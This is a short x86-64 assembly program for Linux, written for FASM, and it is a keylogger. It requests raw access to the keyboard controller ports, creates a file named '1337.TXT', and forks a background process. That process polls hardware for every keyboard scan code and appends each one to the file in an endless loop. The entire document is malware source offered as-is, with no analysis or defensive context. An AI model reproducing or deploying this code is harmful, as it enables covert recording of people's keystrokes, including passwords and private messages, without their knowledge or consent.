format ELF64 executable

segment readable writable executable

entry $

start:

MOV RAX,173
MOV RDI,60h
MOV RSI,1
MOV RDX,1
syscall

MOV RAX,173
MOV RDI,64h
MOV RSI,1
MOV RDX,1
syscall

MOV RAX,85
MOV RDI,FILE_NAME
MOV RSI,0
syscall
MOV [FD],RAX


MOV RAX,57
syscall

CMP RAX,0
JZ KEYLOGGER

RET

KEYLOGGER:

L0:
CALL GET_SCAN_CODE
MOV BYTE[SCAN_CODE],AL

MOV RDI,[FD]
LEA RSI,[SCAN_CODE]
MOV RDX,1
MOV RAX,1
syscall

JMP L0

GET_SCAN_CODE:
IN AL,64h
AND AL,21h
CMP AL,1
JNZ GET_SCAN_CODE
CALL DELAY
IN AL,60h
RET

DELAY:
MOV RCX,9000h
L1:
CMP RCX,0
JZ END_DELAY
DEC RCX
JMP L1
END_DELAY:
RET

FILE_NAME DB "1337.TXT",0
FD DQ 0
SCAN_CODE DB 0
